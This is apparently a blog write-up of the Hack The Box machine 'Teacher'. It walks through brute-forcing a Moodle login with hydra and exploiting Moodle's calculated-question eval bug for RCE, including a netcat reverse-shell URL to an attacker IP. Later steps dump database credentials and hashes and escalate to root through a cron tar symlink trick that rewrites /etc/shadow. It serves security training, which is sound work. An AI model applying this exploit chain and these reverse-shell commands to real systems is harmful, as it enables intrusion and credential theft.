---
layout: single
title: Teacher - Hack The Box
excerpt: "Teacher uses the Moodle Open Source Learning platform and contains a vulnerability in the math formula that gives us RCE. The credentials for the Moodle application are found in a .png file that contains text instead of an actual image. After getting a shell with the math formula, we find the low privilege user credentials in the MySQL database. We then escalate to root by abusing a backup script running from a cronjob as root."
date: 2019-04-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-teacher/teacher_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - moodle
  - mysql
  - enumeration
  - ctf
  - tar
  - cronjob
---

![](/assets/images/htb-writeup-teacher/teacher_logo.png)

Teacher uses the Moodle Open Source Learning platform and contains a vulnerability in the math formula that gives us RCE. The credentials for the Moodle application are found in a .png file that contains text instead of an actual image. After getting a shell with the math formula, we find the low privilege user credentials in the MySQL database. We then escalate to root by abusing a backup script running from a cronjob as root.

## Tools/Exploits/CVEs used

- [https://blog.ripstech.com/2018/moodle-remote-code-execution/](https://blog.ripstech.com/2018/moodle-remote-code-execution/)
- [https://github.com/StefanoDeVuono/steghide](stehide)

### Nmap

Only the HTTP port is open on this box, running the Apache webserver.

```
# nmap -F -sC -sV 10.10.10.153
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-01 21:20 EST
Nmap scan report for teacher.htb (10.10.10.153)
Host is up (0.018s latency).
Not shown: 99 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool
```

### Enumerating the website

![](/assets/images/htb-writeup-teacher/webpage.png)

The first pass at dirbursting shows the `/moodle` directory, which refers to the [Moodle](https://moodle.org/) Open Source Learning platform.
```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://teacher.htb
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/javascript (Status: 301)
/js (Status: 301)
/manual (Status: 301)
/moodle (Status: 301)
/phpmyadmin (Status: 403)
/server-status (Status: 403)
=====================================================
2018/12/01 14:02:42 Finished
=====================================================
```

I also spidered the host with Burp hoping to catch other stuff. I noticed that the image file `5.png` wasn't showing up with the same icon as the rest of the other files:

![](/assets/images/htb-writeup-teacher/images.png)

When we browse to the gallery, we also see there's an image missing:

![](/assets/images/htb-writeup-teacher/slide.png)

The source code contains the file as well as a weird javascript console message:

![](/assets/images/htb-writeup-teacher/source.png)

The `5.png` image file exists but isn't a valid image:

![](/assets/images/htb-writeup-teacher/cannot.png)

If we look at the file with Burp, we see that the file contains part of a password: `Th4C00lTheacha`. We can guess that the user is probably named Giovanni based on the note.

![](/assets/images/htb-writeup-teacher/password.png)

### Moodle enumeration

The Moodle application is running on this server, as shown below:

![](/assets/images/htb-writeup-teacher/moodle.png)

Guest login is enabled but we don't have access to anything useful with this account.

We got a partial password from the `5.png` file but we're missing the last letter. I used the following script to generate a wordlist:

```python
f = open('pwd', 'w')
for i in range (0,127):
	f.write('Th4C00lTheacha{}\n'.format(chr(i)))
```	

Then using hydra we can bruteforce the `giovanni` account. We'll match on `Set-Cookie` as a positive response since the cookie is only set when we submit the correct credentials.

```
# hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form "/moodle/login/index.php:username=^USER^&password=^PASS^:S=Set-Cookie"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-01 21:37:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1/p:128), ~8 tries per task
[DATA] attacking http-post-form://10.10.10.153:80//moodle/login/index.php:username=^USER^&password=^PASS^:S=Set-Cookie
[80][http-post-form] host: 10.10.10.153   login: giovanni   password: Th4C00lTheacha#
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-12-01 21:38:06
```

We found the password: `Th4C00lTheacha#`

We can now log in to the Moodle webpage with `giovanni / Th4C00lTheacha#`:

![](/assets/images/htb-writeup-teacher/giovanni.png)

I googled vulnerabilities for Moodle and found a [blog post](https://blog.ripstech.com/2018/moodle-remote-code-execution/) about an RCE vulnerability in the Math formulas of the Quiz component. Basically, the math formula uses the PHP `eval` function to return the result and the input sanitization that is put in place in Moodle is not sufficient and can bypassed. Once we have RCE we can spawn a reverse shell. 

First we add a new quiz:
![](/assets/images/htb-writeup-teacher/quiz.png)

Then create a question with 'Calculated' type:
![](/assets/images/htb-writeup-teacher/calculated.png)

We can put anything in the question name and text but for the formula we enter ``/*{a*/`$_GET[0]`;//{x}}``
![](/assets/images/htb-writeup-teacher/formula.png)

The formula will execute code we put in the `$_GET['0']` parameter:

`10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=(nc -e /bin/bash 10.10.14.23 4444)`

![](/assets/images/htb-writeup-teacher/formula2.png)

This'll spawn a shell for us:

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.153] 49210
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@teacher:/var/www/html/moodle/question$
```

### Getting access to giovanni user

Like any web application with a database backend, the first thing I do once I get a shell is look for hardcoded database credentials in the PHP configuration file of the application. The Moodle configuration file contains the `root` account password for the MySQL database:

```
www-data@teacher:/var/www/html/moodle$ cat config.php
<?php  // Moodle configuration file
[...]
$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
```

List of databases:
```
MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
```

The `mdl_user` table contains passwords:
```
MariaDB [moodle]> show tables;
show tables;
+----------------------------------+
| Tables_in_moodle                 |
+----------------------------------+
...
| mdl_user                         |
...
```

```
MariaDB [moodle]> select * from mdl_user;
select * from mdl_user;
+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |
+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
|    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |
|    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               |
|    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1543718703 | 1543718276 |   1543718446 | 10.10.14.23   |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |            0 |          |                  |                   |            |               |
| 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |
+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
4 rows in set (0.00 sec)
```

The `Giovannibak` account hash the `7a860966115182402ed06375cf0a22af` MD5 hash, which is `expelled` if we look it up on [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx).

```
www-data@teacher:/$ su -l giovanni
Password: expelled

giovanni@teacher:~$ cat user.txt
cat user.txt
fa9ae...
```

### Priv esc

The `/home/giovanni/work` directory contains a bunch of files, but the `backup_courses.tar.gz` timestamp keep changing every minute so we can assume the file is being created by a cron job running as root:

```
giovanni@teacher:~/work$ ls -lR
ls -lR
.:
total 8
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27 04:58 courses
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27 04:34 tmp

./courses:
total 4
drwxr-xr-x 2 root root 4096 Jun 27 04:15 algebra

./courses/algebra:
total 4
-rw-r--r-- 1 giovanni giovanni 109 Jun 27 04:12 answersAlgebra

./tmp:
total 8
-rwxrwxrwx 1 root root  256 Dec  2 03:52 backup_courses.tar.gz
drwxrwxrwx 3 root root 4096 Jun 27 04:58 courses

./tmp/courses:
total 4
drwxrwxrwx 2 root root 4096 Jun 27 04:15 algebra

./tmp/courses/algebra:
total 4
-rwxrwxrwx 1 giovanni giovanni 109 Jun 27 04:12 answersAlgebra

giovanni@teacher:~/work$ date
Sun Dec  2 03:52:38 CET 2018
```

The backup script that runs as root is located in `/usr/bin/backup.sh`:
```
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

We can get the root flag by replacing the `courses` directory with a symlink to `/root`, waiting for the next archive to be created then untar it to retrieve the root flag:
```
giovanni@teacher:~/work$ mv courses test
giovanni@teacher:~/work$ ln -s /root courses
[ ... wait a minute ...]
giovanni@teacher:~/work/tmp/courses$ cat root.txt
cat root.txt
4f3a8...
```

The cronjob changes the permissions to 777 when it extracts the backup archive. If we swap the `courses` directory in the `~/work/tmp` folder with a symlink to `/etc` it'll change the permissions of `/etc` and everything in it to 777:
```
giovanni@teacher:~/work/tmp$ rm -rf courses
giovanni@teacher:~/work/tmp$ ln -s /etc courses

giovanni@teacher:~/work/tmp$ ls -l / | grep etc
ls -l / | grep etc
drwxrwxrwx 85 root root  4096 Apr 18 21:55 etc
```

Now that we have complete read-write access to anything in `/etc` we can change the password of the root user to anything we want:
```
giovanni@teacher:/etc$ mkpasswd -m sha-512 yolo1234
$6$jfdDr.oQ3xp6H/Em$iIPF1i31pZ/SeZe31/LDhruZFflDbmiFdsln.BA2w./lOtMUHMZYLOwsPAJaufSB4/Sn/gNIwZMWquEGR.sh1/
```

After editing the `/etc/shadow` file we can log in as root:
```
giovanni@teacher:/etc$ su -l root
Password: 
root@teacher:~# id
uid=0(root) gid=0(root) groups=0(root)
```
